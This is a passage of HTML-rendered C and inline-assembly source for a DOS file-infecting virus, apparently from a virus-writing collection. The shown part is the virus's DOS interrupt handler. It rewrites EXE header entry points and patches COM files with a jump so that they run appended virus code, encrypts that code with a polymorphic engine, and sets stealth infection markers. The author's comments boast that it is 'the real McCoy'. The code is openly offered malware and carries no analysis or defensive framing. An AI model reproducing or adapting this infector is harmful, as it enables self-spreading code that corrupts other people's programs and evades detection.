                        </span><span class="sc11">host_ip</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">exe_buffer</span><span class="sc10">.</span><span class="sc11">exe_IP</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc11">lx</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ldiv</span><span class="sc10">(</span><span class="sc11">filelength</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x10</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc11">lx</span><span class="sc10">.</span><span class="sc11">quot</span><span class="sc0"> </span><span class="sc10">-=</span><span class="sc0"> </span><span class="sc11">exe_buffer</span><span class="sc10">.</span><span class="sc11">exe_hdr_size</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc2">// fill new entrypoint (virus) in header
</span><span class="sc0">                        </span><span class="sc11">exe_buffer</span><span class="sc10">.</span><span class="sc11">exe_CS</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">WORD</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">lx</span><span class="sc10">.</span><span class="sc11">quot</span><span class="sc10">-</span><span class="sc4">0x10</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc11">exe_buffer</span><span class="sc10">.</span><span class="sc11">exe_IP</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">WORD</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">lx</span><span class="sc10">.</span><span class="sc11">rem</span><span class="sc10">+</span><span class="sc4">0x100</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc11">exe_buffer</span><span class="sc10">.</span><span class="sc11">exe_SS</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">WORD</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">lx</span><span class="sc10">.</span><span class="sc11">quot</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc11">exe_buffer</span><span class="sc10">.</span><span class="sc11">exe_SP</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">get_virus_size</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)+</span><span class="sc4">0x301</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc11">exe_buffer</span><span class="sc10">.</span><span class="sc11">exe_min_mem</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">get_virus_paragraphs</span><span class="sc10">();</span><span class="sc0">
                        </span><span class="sc11">stats</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">allocmem</span><span class="sc10">(</span><span class="sc11">get_virus_paragraphs</span><span class="sc10">()+</span><span class="sc4">10</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">segp</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">stats</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">          </span><span class="sc2">// enough memory?
</span><span class="sc0">                            </span><span class="sc2">// Poly code here
</span><span class="sc0">                          </span><span class="sc11">_CX</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">get_virus_size</span><span class="sc10">();</span><span class="sc0">
                          </span><span class="sc11">ch</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">MK_FP</span><span class="sc10">(</span><span class="sc11">segp</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
                          </span><span class="sc11">_SI</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">virus_start</span><span class="sc10">;</span><span class="sc0">
                          </span><span class="sc11">_ES</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">segp</span><span class="sc10">;</span><span class="sc0">
                          </span><span class="sc11">_DI</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
                          </span><span class="sc11">_AX</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">exe_buffer</span><span class="sc10">.</span><span class="sc11">exe_IP</span><span class="sc10">;</span><span class="sc0">
                          </span><span class="sc11">fse</span><span class="sc10">();</span><span class="sc0">                    </span><span class="sc2">// my fucking small engine
</span><span class="sc0">                          </span><span class="sc11">_ES</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">_CS</span><span class="sc10">;</span><span class="sc0">
                          </span><span class="sc11">_DS</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">_CS</span><span class="sc10">;</span><span class="sc0">
                          </span><span class="sc11">_dos_write</span><span class="sc10">(</span><span class="sc11">handle</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ch</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">virus_stealth_size</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">stats</span><span class="sc10">);</span><span class="sc0">
                          </span><span class="sc11">freemem</span><span class="sc10">(</span><span class="sc11">segp</span><span class="sc10">);</span><span class="sc0">            </span><span class="sc2">// free memory used by fse
</span><span class="sc0">                        </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0">
                          </span><span class="sc2">// Not enough memory, so we just don't poly
</span><span class="sc0">                          </span><span class="sc11">_write</span><span class="sc10">(</span><span class="sc11">handle</span><span class="sc10">,&amp;</span><span class="sc11">virus_start</span><span class="sc10">,</span><span class="sc11">virus_stealth_size</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc11">filelength</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">lseek</span><span class="sc10">(</span><span class="sc11">handle</span><span class="sc10">,</span><span class="sc4">0L</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SEEK_END</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc11">lx</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ldiv</span><span class="sc10">(</span><span class="sc11">filelength</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x200</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc2">// update exe pagecount
</span><span class="sc0">                        </span><span class="sc11">exe_buffer</span><span class="sc10">.</span><span class="sc11">exe_pages</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">WORD</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">lx</span><span class="sc10">.</span><span class="sc11">quot</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc11">exe_buffer</span><span class="sc10">.</span><span class="sc11">exe_last_page</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">WORD</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">lx</span><span class="sc10">.</span><span class="sc11">rem</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc11">exe_buffer</span><span class="sc10">.</span><span class="sc11">exe_pages</span><span class="sc10">++;</span><span class="sc0">
                        </span><span class="sc2">// and set infection marker (checksum field)
</span><span class="sc0">                        </span><span class="sc11">exe_buffer</span><span class="sc10">.</span><span class="sc11">exe_crc</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0x29A</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc11">lseek</span><span class="sc10">(</span><span class="sc11">handle</span><span class="sc10">,</span><span class="sc4">0L</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SEEK_SET</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc11">_write</span><span class="sc10">(</span><span class="sc11">handle</span><span class="sc10">,&amp;</span><span class="sc11">exe_buffer</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">exe_buffer</span><span class="sc10">));</span><span class="sc0">
                        </span><span class="sc11">filedate</span><span class="sc10">.</span><span class="sc11">ft_tsec</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">30</span><span class="sc10">;</span><span class="sc0">      </span><span class="sc2">// is 60!
</span><span class="sc0">                        </span><span class="sc11">setftime</span><span class="sc10">(</span><span class="sc11">handle</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">filedate</span><span class="sc10">);</span><span class="sc0">
                      </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
              </span><span class="sc2">// COM file
</span><span class="sc0">              </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">org4bytes</span><span class="sc10">[</span><span class="sc4">3</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc7">'!'</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">            </span><span class="sc2">// already infected?
</span><span class="sc0">                </span><span class="sc11">filelength</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">lseek</span><span class="sc10">(</span><span class="sc11">handle</span><span class="sc10">,</span><span class="sc4">0L</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SEEK_END</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">filelength</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0xf000</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">filelength</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0x100</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                  </span><span class="sc2">// file is not too long
</span><span class="sc0">                  </span><span class="sc11">stats</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">allocmem</span><span class="sc10">(</span><span class="sc11">get_virus_paragraphs</span><span class="sc10">()+</span><span class="sc4">10</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">segp</span><span class="sc10">);</span><span class="sc0">
                  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">stats</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc2">// Poly code here
</span><span class="sc0">                    </span><span class="sc11">_CX</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">get_virus_size</span><span class="sc10">();</span><span class="sc0">
                    </span><span class="sc11">ch</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">MK_FP</span><span class="sc10">(</span><span class="sc11">segp</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">_SI</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">virus_start</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc11">_ES</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">segp</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc11">_DI</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc11">_AX</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">filelength</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">0x100</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc11">fse</span><span class="sc10">();</span><span class="sc0">                          </span><span class="sc2">// what was it again? ;-)
</span><span class="sc0">                    </span><span class="sc11">_ES</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">_CS</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc11">_DS</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">_CS</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc11">_dos_write</span><span class="sc10">(</span><span class="sc11">handle</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ch</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">virus_stealth_size</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">stats</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">freemem</span><span class="sc10">(</span><span class="sc11">segp</span><span class="sc10">);</span><span class="sc0">
                  </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0">
                     </span><span class="sc2">// Not enough memory, so we just don't poly
</span><span class="sc0">                    </span><span class="sc11">_write</span><span class="sc10">(</span><span class="sc11">handle</span><span class="sc10">,&amp;</span><span class="sc11">virus_start</span><span class="sc10">,</span><span class="sc11">virus_stealth_size</span><span class="sc10">);</span><span class="sc0">
                  </span><span class="sc11">lseek</span><span class="sc10">(</span><span class="sc11">handle</span><span class="sc10">,</span><span class="sc4">0L</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SEEK_SET</span><span class="sc10">);</span><span class="sc0">
                  </span><span class="sc11">filelength</span><span class="sc0"> </span><span class="sc10">-=</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">;</span><span class="sc0">                  </span><span class="sc2">// calc com jump to virus
</span><span class="sc0">                  </span><span class="sc11">newbytes</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">filelength</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0xff</span><span class="sc10">;</span><span class="sc0">
                  </span><span class="sc11">newbytes</span><span class="sc10">[</span><span class="sc4">2</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">filelength</span><span class="sc0"> </span><span class="sc10">&gt;&gt;</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0xff</span><span class="sc10">;</span><span class="sc0">
                  </span><span class="sc11">_write</span><span class="sc10">(</span><span class="sc11">handle</span><span class="sc10">,</span><span class="sc11">newbytes</span><span class="sc10">,</span><span class="sc4">4</span><span class="sc10">);</span><span class="sc0">
                  </span><span class="sc11">filedate</span><span class="sc10">.</span><span class="sc11">ft_tsec</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">30</span><span class="sc10">;</span><span class="sc0">            </span><span class="sc2">// is 60!
</span><span class="sc0">                  </span><span class="sc11">setftime</span><span class="sc10">(</span><span class="sc11">handle</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">filedate</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
              </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc11">_close</span><span class="sc10">(</span><span class="sc11">handle</span><span class="sc10">);</span><span class="sc0">                         </span><span class="sc2">// we're done...
</span><span class="sc0">        </span><span class="sc10">}</span><span class="sc0">

      </span><span class="sc10">}</span><span class="sc0">
      </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">eoi_21</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">};</span><span class="sc0">

</span><span class="sc2">// Chain to old interrupt
</span><span class="sc11">eoi_21</span><span class="sc10">:</span><span class="sc0">
</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">asm</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">mov</span><span class="sc0"> </span><span class="sc11">sp</span><span class="sc10">,</span><span class="sc11">bp</span><span class="sc0">
    </span><span class="sc11">pop</span><span class="sc0"> </span><span class="sc11">bp</span><span class="sc0">
    </span><span class="sc11">pop</span><span class="sc0"> </span><span class="sc11">di</span><span class="sc0">
    </span><span class="sc11">pop</span><span class="sc0"> </span><span class="sc11">si</span><span class="sc0">
    </span><span class="sc11">pop</span><span class="sc0"> </span><span class="sc11">ds</span><span class="sc0">
    </span><span class="sc11">pop</span><span class="sc0"> </span><span class="sc11">es</span><span class="sc0">
    </span><span class="sc11">pop</span><span class="sc0"> </span><span class="sc11">dx</span><span class="sc0">
    </span><span class="sc11">pop</span><span class="sc0"> </span><span class="sc11">cx</span><span class="sc0">
    </span><span class="sc11">pop</span><span class="sc0"> </span><span class="sc11">bx</span><span class="sc0">
    </span><span class="sc11">pop</span><span class="sc0"> </span><span class="sc11">ax</span><span class="sc0">
    </span><span class="sc11">jmp</span><span class="sc0"> </span><span class="sc11">dword</span><span class="sc0"> </span><span class="sc19">ptr</span><span class="sc0"> </span><span class="sc11">cs</span><span class="sc10">:[</span><span class="sc11">old_int_21</span><span class="sc10">]</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc2">// Oh, eh... Raid, this isn't a host encrypting prepending non resident
// infector, this is the real McCoy (I hope you can stand a joke, but you
// get the drift).</span></div></body>
</html>
